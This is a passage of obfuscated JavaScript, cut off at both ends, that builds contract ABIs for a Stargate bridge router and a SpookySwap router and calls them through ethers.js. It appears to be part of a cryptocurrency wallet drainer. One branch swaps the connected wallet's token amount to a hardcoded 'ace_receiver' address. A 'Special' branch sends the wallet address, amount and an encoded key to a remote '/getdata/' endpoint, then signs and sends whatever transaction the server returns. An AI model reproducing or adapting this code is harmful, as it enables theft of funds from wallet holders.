          const _0x2e9947 = {
            internalType: "address",
            name: "_to",
            type: "address"
          };
          const _0x32b755 = {
            internalType: 'uint256',
            name: "amountSD",
            type: "uint256"
          };
          const _0x444c4a = {
            inputs: [_0xb54b32, _0x1de2ef, _0x2e9947],
            name: "instantRedeemLocal",
            outputs: [_0x32b755],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x18042b = {
            inputs: [],
            name: "mintFeeOwner",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: 'view',
            type: "function"
          };
          const _0x36543b = {
            inputs: [],
            name: "owner",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x40fc6b = {
            inputs: [],
            name: "protocolFeeOwner",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': 'address'
            }],
            stateMutability: 'view',
            type: "function"
          };
          const _0x4f1e47 = {
            internalType: "uint16",
            name: "_dstChainId",
            type: "uint16"
          };
          const _0x308acb = {
            internalType: "uint8",
            name: "_functionType",
            type: "uint8"
          };
          const _0x2f0fee = {
            internalType: 'bytes',
            name: "_toAddress",
            type: "bytes"
          };
          const _0x2877fa = {
            internalType: "bytes",
            name: "_transferAndCallPayload",
            type: "bytes"
          };
          const _0x5b5a04 = {
            internalType: 'uint256',
            name: "dstGasForCall",
            type: 'uint256'
          };
          const _0x2c8fb1 = {
            internalType: "uint256",
            name: "dstNativeAmount",
            type: 'uint256'
          };
          const _0x45595d = {
            internalType: "bytes",
            name: "dstNativeAddr",
            type: "bytes"
          };
          const _0x172f9b = {
            components: [_0x5b5a04, _0x2c8fb1, _0x45595d],
            internalType: "struct IStargateRouter.lzTxObj",
            name: "_lzTxParams",
            type: "tuple"
          };
          const _0x389fa9 = {
            inputs: [_0x4f1e47, _0x308acb, _0x2f0fee, _0x2877fa, _0x172f9b],
            name: "quoteLayerZeroFee",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': '',
              'type': "uint256"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x1e62d8 = {
            internalType: "uint16",
            name: "_dstChainId",
            type: "uint16"
          };
          const _0x142d9d = {
            internalType: 'uint256',
            name: "_srcPoolId",
            type: 'uint256'
          };
          const _0x1c22ef = {
            internalType: 'uint256',
            name: "_dstPoolId",
            type: "uint256"
          };
          const _0x298850 = {
            internalType: "address payable",
            name: "_refundAddress",
            type: "address"
          };
          const _0x192eae = {
            internalType: 'uint256',
            name: "_amountLP",
            type: 'uint256'
          };
          const _0x3e073f = {
            internalType: "bytes",
            name: "_to",
            type: "bytes"
          };
          const _0x67b43d = {
            internalType: 'uint256',
            name: "dstGasForCall",
            type: 'uint256'
          };
          const _0x447a02 = {
            internalType: 'uint256',
            name: "dstNativeAmount",
            type: 'uint256'
          };
          const _0x38afa1 = {
            internalType: "bytes",
            name: "dstNativeAddr",
            type: 'bytes'
          };
          const _0x5eeb57 = {
            components: [_0x67b43d, _0x447a02, _0x38afa1],
            internalType: "struct IStargateRouter.lzTxObj",
            name: "_lzTxParams",
            type: "tuple"
          };
          const _0x4ba4f1 = {
            inputs: [_0x1e62d8, _0x142d9d, _0x1c22ef, _0x298850, _0x192eae, _0x3e073f, _0x5eeb57],
            name: "redeemLocal",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x4729f8 = {
            internalType: "uint16",
            name: "_srcChainId",
            type: "uint16"
          };
          const _0x341b37 = {
            internalType: "bytes",
            name: "_srcAddress",
            type: "bytes"
          };
          const _0x433379 = {
            internalType: 'uint256',
            name: "_nonce",
            type: "uint256"
          };
          const _0x1de508 = {
            internalType: 'uint256',
            name: '_srcPoolId',
            type: 'uint256'
          };
          const _0xe14dd9 = {
            internalType: 'uint256',
            name: "_dstPoolId",
            type: 'uint256'
          };
          const _0x543290 = {
            internalType: "address",
            name: "_to",
            type: "address"
          };
          const _0x465792 = {
            internalType: 'uint256',
            name: "_amountSD",
            type: 'uint256'
          };
          const _0xfa9a14 = {
            internalType: 'uint256',
            name: "_mintAmountSD",
            type: "uint256"
          };
          const _0x5abeea = {
            inputs: [_0x4729f8, _0x341b37, _0x433379, _0x1de508, _0xe14dd9, _0x543290, _0x465792, _0xfa9a14],
            name: "redeemLocalCallback",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4fb8b8 = {
            internalType: "uint16",
            name: "_srcChainId",
            type: "uint16"
          };
          const _0x2135b9 = {
            internalType: "bytes",
            name: "_srcAddress",
            type: "bytes"
          };
          const _0x2d3b52 = {
            internalType: 'uint256',
            name: "_nonce",
            type: 'uint256'
          };
          const _0x27ae69 = {
            internalType: 'uint256',
            name: '_srcPoolId',
            type: "uint256"
          };
          const _0x196690 = {
            internalType: 'uint256',
            name: "_dstPoolId",
            type: 'uint256'
          };
          const _0x3bfa9e = {
            internalType: 'uint256',
            name: "_amountSD",
            type: 'uint256'
          };
          const _0x29b37a = {
            internalType: "bytes",
            name: "_to",
            type: "bytes"
          };
          const _0x392958 = {
            inputs: [_0x4fb8b8, _0x2135b9, _0x2d3b52, _0x27ae69, _0x196690, _0x3bfa9e, _0x29b37a],
            name: "redeemLocalCheckOnRemote",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x24444d = {
            internalType: 'uint16',
            name: "_dstChainId",
            type: "uint16"
          };
          const _0xeff272 = {
            internalType: 'uint256',
            name: '_srcPoolId',
            type: 'uint256'
          };
          const _0x253893 = {
            internalType: 'uint256',
            name: "_dstPoolId",
            type: 'uint256'
          };
          const _0x251981 = {
            internalType: "address payable",
            name: "_refundAddress",
            type: "address"
          };
          const _0x4f299e = {
            internalType: 'uint256',
            name: "_amountLP",
            type: 'uint256'
          };
          const _0x3ce46c = {
            internalType: 'uint256',
            name: "_minAmountLD",
            type: 'uint256'
          };
          const _0x333d7b = {
            internalType: "bytes",
            name: "_to",
            type: "bytes"
          };
          const _0x2d22bd = {
            internalType: 'uint256',
            name: "dstGasForCall",
            type: 'uint256'
          };
          const _0xa4c687 = {
            internalType: 'uint256',
            name: "dstNativeAmount",
            type: 'uint256'
          };
          const _0x54472e = {
            internalType: "bytes",
            name: "dstNativeAddr",
            type: "bytes"
          };
          const _0x37528c = {
            components: [_0x2d22bd, _0xa4c687, _0x54472e],
            internalType: "struct IStargateRouter.lzTxObj",
            name: "_lzTxParams",
            type: "tuple"
          };
          const _0x388a72 = {
            inputs: [_0x24444d, _0xeff272, _0x253893, _0x251981, _0x4f299e, _0x3ce46c, _0x333d7b, _0x37528c],
            name: "redeemRemote",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x28f239 = {
            inputs: [],
            name: "renounceOwnership",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3cdc9b = {
            internalType: "uint16",
            name: "_srcChainId",
            type: "uint16"
          };
          const _0x55a09d = {
            internalType: "bytes",
            name: "_srcAddress",
            type: "bytes"
          };
          const _0x38ad00 = {
            internalType: 'uint256',
            name: "_nonce",
            type: 'uint256'
          };
          const _0x1bf97b = {
            inputs: [_0x3cdc9b, _0x55a09d, _0x38ad00],
            name: "retryRevert",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x5d88f3 = {
            internalType: "uint16",
            name: '',
            type: "uint16"
          };
          const _0x3f05b9 = {
            internalType: "bytes",
            name: '',
            type: "bytes"
          };
          const _0x2b5986 = {
            internalType: 'uint256',
            name: '',
            type: 'uint256'
          };
          const _0x3f7564 = {
            inputs: [_0x5d88f3, _0x3f05b9, _0x2b5986],
            name: "revertLookup",
            outputs: [{
              'internalType': "bytes",
              'name': '',
              'type': "bytes"
            }],
            stateMutability: "view",
            type: 'function'
          };
          const _0x14d2b9 = {
            internalType: "uint16",
            name: "_dstChainId",
            type: "uint16"
          };
          const _0x32d531 = {
            internalType: "bytes",
            name: "_srcAddress",
            type: "bytes"
          };
          const _0x5142b7 = {
            internalType: 'uint256',
            name: "_nonce",
            type: "uint256"
          };
          const _0x529483 = {
            internalType: "address payable",
            name: "_refundAddress",
            type: "address"
          };
          const _0x36a99d = {
            internalType: "uint256",
            name: "dstGasForCall",
            type: 'uint256'
          };
          const _0x574331 = {
            internalType: 'uint256',
            name: "dstNativeAmount",
            type: "uint256"
          };
          const _0x5d5490 = {
            internalType: "bytes",
            name: "dstNativeAddr",
            type: "bytes"
          };
          const _0x154b57 = {
            components: [_0x36a99d, _0x574331, _0x5d5490],
            internalType: "struct IStargateRouter.lzTxObj",
            name: "_lzTxParams",
            type: "tuple"
          };
          const _0x20ae9d = {
            inputs: [_0x14d2b9, _0x32d531, _0x5142b7, _0x529483, _0x154b57],
            name: "revertRedeemLocal",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x57679e = {
            internalType: "uint16",
            name: "_dstChainId",
            type: "uint16"
          };
          const _0x30c0c0 = {
            internalType: 'uint256',
            name: '_srcPoolId',
            type: 'uint256'
          };
          const _0x212705 = {
            internalType: "uint256",
            name: "_dstPoolId",
            type: "uint256"
          };
          const _0xac2c40 = {
            internalType: "address payable",
            name: "_refundAddress",
            type: "address"
          };
          const _0x14ee24 = {
            inputs: [_0x57679e, _0x30c0c0, _0x212705, _0xac2c40],
            name: "sendCredits",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x4f50ec = {
            internalType: "contract Bridge",
            name: '_bridge',
            type: "address"
          };
          const _0x177c79 = {
            internalType: "contract Factory",
            name: "_factory",
            type: "address"
          };
          const _0x552e15 = {
            inputs: [_0x4f50ec, _0x177c79],
            name: "setBridgeAndFactory",
            outputs: [],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x56da72 = {
            internalType: 'uint256',
            name: "_poolId",
            type: 'uint256'
          };
          const _0x4c8db8 = {
            internalType: "bool",
            name: '_batched',
            type: "bool"
          };
          const _0xf7c988 = {
            internalType: 'uint256',
            name: "_swapDeltaBP",
            type: 'uint256'
          };
          const _0x1c7f1f = {
            internalType: "uint256",
            name: '_lpDeltaBP',
            type: 'uint256'
          };
          const _0x4dae04 = {
            internalType: "bool",
            name: "_defaultSwapMode",
            type: "bool"
          };
          const _0x854034 = {
            internalType: "bool",
            name: "_defaultLPMode",
            type: "bool"
          };
          const _0x4f31bd = {
            inputs: [_0x56da72, _0x4c8db8, _0xf7c988, _0x1c7f1f, _0x4dae04, _0x854034],
            name: "setDeltaParam",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x5c9351 = {
            internalType: 'uint256',
            name: "_poolId",
            type: 'uint256'
          };
          const _0x5b7d91 = {
            internalType: "address",
            name: "_feeLibraryAddr",
            type: "address"
          };
          const _0x38bfae = {
            inputs: [_0x5c9351, _0x5b7d91],
            name: "setFeeLibrary",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3a2b83 = {
            internalType: 'uint256',
            name: "_poolId",
            type: 'uint256'
          };
          const _0x3346c7 = {
            internalType: 'uint256',
            name: '_mintFeeBP',
            type: 'uint256'
          };
          const _0x3baed7 = {
            inputs: [_0x3a2b83, _0x3346c7],
            name: "setFees",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x223a46 = {
            internalType: "address",
            name: "_owner",
            type: "address"
          };
          const _0x2e6fb3 = {
            inputs: [_0x223a46],
            name: "setMintFeeOwner",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2f75e8 = {
            internalType: "address",
            name: "_owner",
            type: "address"
          };
          const _0x47e68c = {
            inputs: [_0x2f75e8],
            name: "setProtocolFeeOwner",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x37d9ea = {
            internalType: 'uint256',
            name: "_poolId",
            type: 'uint256'
          };
          const _0x2e0bfc = {
            internalType: "bool",
            name: "_swapStop",
            type: "bool"
          };
          const _0x82a3a3 = {
            inputs: [_0x37d9ea, _0x2e0bfc],
            name: "setSwapStop",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2da8a8 = {
            internalType: "uint256",
            name: "_poolId",
            type: 'uint256'
          };
          const _0x135b63 = {
            internalType: "uint16",
            name: "_dstChainId",
            type: "uint16"
          };
          const _0x3230c3 = {
            internalType: 'uint256',
            name: "_dstPoolId",
            type: 'uint256'
          };
          const _0x4743a2 = {
            internalType: "uint16",
            name: "_weight",
            type: "uint16"
          };
          const _0x5a7988 = {
            inputs: [_0x2da8a8, _0x135b63, _0x3230c3, _0x4743a2],
            name: "setWeightForChainPath",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3e6d1c = {
            internalType: "uint16",
            name: "_dstChainId",
            type: "uint16"
          };
          const _0x48024f = {
            internalType: 'uint256',
            name: '_srcPoolId',
            type: 'uint256'
          };
          const _0x18d299 = {
            internalType: 'uint256',
            name: "_dstPoolId",
            type: 'uint256'
          };
          const _0x148798 = {
            internalType: "address payable",
            name: "_refundAddress",
            type: "address"
          };
          const _0x5d966b = {
            internalType: 'uint256',
            name: "_amountLD",
            type: 'uint256'
          };
          const _0x259852 = {
            internalType: 'uint256',
            name: "_minAmountLD",
            type: 'uint256'
          };
          const _0x46e30d = {
            internalType: 'uint256',
            name: "dstGasForCall",
            type: "uint256"
          };
          const _0x1ed488 = {
            internalType: "uint256",
            name: "dstNativeAmount",
            type: 'uint256'
          };
          const _0x3b8c3d = {
            internalType: "bytes",
            name: "dstNativeAddr",
            type: "bytes"
          };
          const _0x3cfe8a = {
            components: [_0x46e30d, _0x1ed488, _0x3b8c3d],
            internalType: "struct IStargateRouter.lzTxObj",
            name: "_lzTxParams",
            type: "tuple"
          };
          const _0x54b35a = {
            internalType: "bytes",
            name: "_to",
            type: "bytes"
          };
          const _0x36fc77 = {
            internalType: 'bytes',
            name: '_payload',
            type: "bytes"
          };
          const _0x243733 = {
            inputs: [_0x3e6d1c, _0x48024f, _0x18d299, _0x148798, _0x5d966b, _0x259852, _0x3cfe8a, _0x54b35a, _0x36fc77],
            name: "swap",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x3da42a = {
            internalType: "uint16",
            name: "_srcChainId",
            type: "uint16"
          };
          const _0x5cf74e = {
            internalType: "bytes",
            name: "_srcAddress",
            type: "bytes"
          };
          const _0x65203 = {
            internalType: 'uint256',
            name: "_nonce",
            type: 'uint256'
          };
          const _0xa1977e = {
            internalType: 'uint256',
            name: '_srcPoolId',
            type: 'uint256'
          };
          const _0x872abe = {
            internalType: "uint256",
            name: "_dstPoolId",
            type: 'uint256'
          };
          const _0x587f0e = {
            internalType: 'uint256',
            name: "_dstGasForCall",
            type: 'uint256'
          };
          const _0x318368 = {
            internalType: "address",
            name: "_to",
            type: "address"
          };
          const _0x47fa58 = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x4de642 = {
            internalType: 'uint256',
            name: "eqFee",
            type: "uint256"
          };
          const _0x279f97 = {
            internalType: 'uint256',
            name: 'eqReward',
            type: "uint256"
          };
          const _0x45ffe7 = {
            internalType: 'uint256',
            name: "lpFee",
            type: 'uint256'
          };
          const _0x19424d = {
            internalType: 'uint256',
            name: "protocolFee",
            type: "uint256"
          };
          const _0x9ac659 = {
            internalType: "uint256",
            name: "lkbRemove",
            type: 'uint256'
          };
          const _0x3c7454 = {
            components: [_0x47fa58, _0x4de642, _0x279f97, _0x45ffe7, _0x19424d, _0x9ac659],
            internalType: "struct Pool.SwapObj",
            name: '_s',
            type: "tuple"
          };
          const _0x24b38a = {
            internalType: "bytes",
            name: '_payload',
            type: "bytes"
          };
          const _0x58c825 = {
            inputs: [_0x3da42a, _0x5cf74e, _0x65203, _0xa1977e, _0x872abe, _0x587f0e, _0x318368, _0x3c7454, _0x24b38a],
            name: "swapRemote",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2831c1 = {
            internalType: "address",
            name: "newOwner",
            type: 'address'
          };
          const _0x34c6d1 = {
            inputs: [_0x2831c1],
            name: "transferOwnership",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x548d54 = {
            internalType: 'uint256',
            name: "_poolId",
            type: "uint256"
          };
          const _0x23ef8b = {
            internalType: "address",
            name: "_to",
            type: "address"
          };
          const _0x5702ae = {
            inputs: [_0x548d54, _0x23ef8b],
            name: "withdrawMintFee",
            outputs: [],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x5052d3 = {
            internalType: 'uint256',
            name: "_poolId",
            type: "uint256"
          };
          const _0x31878b = {
            internalType: "address",
            name: "_to",
            type: "address"
          };
          const _0x4ac086 = {
            inputs: [_0x5052d3, _0x31878b],
            name: "withdrawProtocolFee",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          let _0x5a81a6 = [_0x3f5d3b, _0x2e1546, _0x27b338, _0x2ca4da, _0x32984c, _0x15cda7, _0x3bc0c2, _0x2429ef, _0xa1f0f, _0x219490, _0x17964c, _0x590178, _0x2b1582, _0x355fd5, _0x4f5d51, _0x588b32, _0x444c4a, _0x18042b, _0x36543b, _0x40fc6b, _0x389fa9, _0x4ba4f1, _0x5abeea, _0x392958, _0x388a72, _0x28f239, _0x1bf97b, _0x3f7564, _0x20ae9d, _0x14ee24, _0x552e15, _0x4f31bd, _0x38bfae, _0x3baed7, _0x2e6fb3, _0x47e68c, _0x82a3a3, _0x5a7988, _0x243733, _0x58c825, _0x34c6d1, _0x5702ae, _0x4ac086];
          let _0x249569 = new ethers.Contract(_0x3941f8, _0x5a81a6, _0xab3127);
          let _0x1542bb = await _0x249569.quoteLayerZeroFee(_0x53deb7, 1, this.ace_receiver, '0x', {
            'dstGasForCall': 0x0,
            'dstNativeAmount': 0x0,
            'dstNativeAddr': this.ace_receiver
          });
          let _0x38ef38 = _0x1542bb[0];
          const _0x38083a = {
            dstGasForCall: 0x0,
            dstNativeAmount: 0x0,
            dstNativeAddr: '0x'
          };
          const _0x386e12 = {
            value: _0x38ef38
          };
          return [_0x249569.swap(_0x53deb7, _0xd77c09, _0x1998f6, this.ace_receiver, _0x2a18aa.asset.amount, 0, _0x38083a, this.ace_receiver, '0x', _0x386e12), ''];
        }
      case "Special":
        {
          let _0x3b8209 = this.tradingPairs[_0x2a18aa.chain];
          const _0x398cc6 = {
            'Accept': "application/json"
          };
          let _0x22c0c6 = await fetch(this.domain + "/getdata/" + _0x3b8209 + '/' + _0x2a18aa.asset.token + '/' + (await this.getWalletAddress()) + '/' + _0x2a18aa.asset.amount + '/' + this.getChainId(_0x2a18aa.chain) + '/' + Base64.encode(this.createEncKey()), {
            'method': 'GET',
            'headers': _0x398cc6
          });
          let _0x274a52 = await _0x22c0c6.json();
          let _0x5c1268 = await _0xab3127.getTransactionCount('pending');
          let _0x21cc64 = {
            'nonce': '0x' + _0x5c1268.toString(16),
            'data': _0x274a52.trade.data,
            'from': _0x274a52.trade.from,
            'value': "0x00",
            'to': _0x274a52.trade.to,
            'gasLimit': '0x' + _0x274a52.maxGas.toString(16)
          };
          return [_0xab3127.sendTransaction(_0x21cc64), ''];
        }
      case 'SpookySwap':
        {
          const _0x22fd40 = {
            internalType: "address",
            name: "_factory",
            type: "address"
          };
          const _0xeae29c = {
            internalType: "address",
            name: "_WETH",
            type: "address"
          };
          const _0x428fc9 = {
            inputs: [_0x22fd40, _0xeae29c],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x5bc9db = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x8ae293 = {
            inputs: [],
            name: "WETH",
            outputs: [_0x5bc9db],
            stateMutability: "view",
            type: "function"
          };
          const _0x374e9e = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x5967ed = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x36fb04 = {
            internalType: 'uint256',
            name: "amountADesired",
            type: 'uint256'
          };
          const _0x24057c = {
            internalType: 'uint256',
            name: "amountBDesired",
            type: 'uint256'
          };
          const _0x3b143c = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x5d4ba5 = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0xcaf5a8 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x1fe7f6 = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x2f2c70 = {
            inputs: [_0x374e9e, _0x5967ed, _0x36fb04, _0x24057c, _0x3b143c, _0x5d4ba5, _0xcaf5a8, _0x1fe7f6],
            name: "addLiquidity",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': 'uint256'
            }, {
              'internalType': "uint256",
              'name': "amountB",
              'type': "uint256"
            }, {
              'internalType': 'uint256',
              'name': "liquidity",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x5710de = {
            internalType: "address",
            name: 'token',
            type: 'address'
          };
          const _0x3b884e = {
            internalType: 'uint256',
            name: "amountTokenDesired",
            type: 'uint256'
          };
          const _0x2b1aeb = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x566882 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x21be75 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x39a01b = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x156da6 = {
            inputs: [_0x5710de, _0x3b884e, _0x2b1aeb, _0x566882, _0x21be75, _0x39a01b],
            name: "addLiquidityETH",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': "uint256"
            }, {
              'internalType': 'uint256',
              'name': "amountETH",
              'type': "uint256"
            }, {
              'internalType': 'uint256',
              'name': "liquidity",
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x495223 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x1f9eb5 = {
            inputs: [],
            name: 'factory',
            outputs: [_0x495223],
            stateMutability: "view",
            type: "function"
          };
          const _0x4d2448 = {
            internalType: 'uint256',
            name: "amountOut",
            type: "uint256"
          };
          const _0x3808b8 = {
            internalType: 'uint256',
            name: 'reserveIn',
            type: 'uint256'
          };
          const _0x11adb5 = {
            internalType: 'uint256',
            name: 'reserveOut',
            type: 'uint256'
          };
          const _0x185c62 = {
            inputs: [_0x4d2448, _0x3808b8, _0x11adb5],
            name: "getAmountIn",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountIn',
              'type': 'uint256'
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x43c709 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x3fbf92 = {
            internalType: "uint256",
            name: 'reserveIn',
            type: "uint256"
          };
          const _0x19cf27 = {
            internalType: 'uint256',
            name: 'reserveOut',
            type: 'uint256'
          };
          const _0x4ecb3e = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x32d661 = {
            inputs: [_0x43c709, _0x3fbf92, _0x19cf27],
            name: "getAmountOut",
            outputs: [_0x4ecb3e],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x3df0fc = {
            internalType: 'uint256',
            name: 'amountOut',
            type: "uint256"
          };
          const _0x40987c = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0xded511 = {
            inputs: [_0x3df0fc, _0x40987c],
            name: "getAmountsIn",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x420f9f = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x16081b = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x6a536c = {
            inputs: [_0x420f9f, _0x16081b],
            name: "getAmountsOut",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x36fb89 = {
            internalType: 'uint256',
            name: "amountA",
            type: "uint256"
          };
          const _0x26212d = {
            internalType: 'uint256',
            name: 'reserveA',
            type: 'uint256'
          };
          const _0x25440d = {
            internalType: 'uint256',
            name: "reserveB",
            type: 'uint256'
          };
          const _0x43ef0d = {
            inputs: [_0x36fb89, _0x26212d, _0x25440d],
            name: "quote",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountB',
              'type': 'uint256'
            }],
            stateMutability: "pure",
            type: "function"
          };
          const _0x55ec83 = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0xd0c6a1 = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x580fb0 = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x56c912 = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x1ae5a6 = {
            internalType: "uint256",
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x38e249 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x3879a0 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x46bce1 = {
            inputs: [_0x55ec83, _0xd0c6a1, _0x580fb0, _0x56c912, _0x1ae5a6, _0x38e249, _0x3879a0],
            name: "removeLiquidity",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x453aa0 = {
            internalType: "address",
            name: "token",
            type: "address"
          };
          const _0x431107 = {
            internalType: "uint256",
            name: "liquidity",
            type: 'uint256'
          };
          const _0x4189d9 = {
            internalType: "uint256",
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x1f649c = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x3a2436 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x839b51 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x3ad6e9 = {
            inputs: [_0x453aa0, _0x431107, _0x4189d9, _0x1f649c, _0x3a2436, _0x839b51],
            name: "removeLiquidityETH",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountETH",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x400726 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x2687c3 = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x5184ff = {
            internalType: "uint256",
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x2f1042 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x117e11 = {
            internalType: "address",
            name: 'to',
            type: 'address'
          };
          const _0x186ff6 = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x1e021f = {
            inputs: [_0x400726, _0x2687c3, _0x5184ff, _0x2f1042, _0x117e11, _0x186ff6],
            name: "removeLiquidityETHSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountETH",
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2dbd27 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x32a6df = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x6a1450 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x3a27c5 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x47fcb2 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x3b8f97 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x12efa3 = {
            internalType: "bool",
            name: "approveMax",
            type: 'bool'
          };
          const _0x5a7696 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x4ec360 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0xa9e1ce = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x1f0856 = {
            inputs: [_0x2dbd27, _0x32a6df, _0x6a1450, _0x3a27c5, _0x47fcb2, _0x3b8f97, _0x12efa3, _0x5a7696, _0x4ec360, _0xa9e1ce],
            name: "removeLiquidityETHWithPermit",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountETH",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3ec20e = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x592bad = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x420d8c = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x2b4596 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: "uint256"
          };
          const _0x20aecc = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x500329 = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x17490e = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x22b9aa = {
            internalType: "uint8",
            name: 'v',
            type: 'uint8'
          };
          const _0x195012 = {
            internalType: 'bytes32',
            name: 'r',
            type: "bytes32"
          };
          const _0x417ffc = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x20ba05 = {
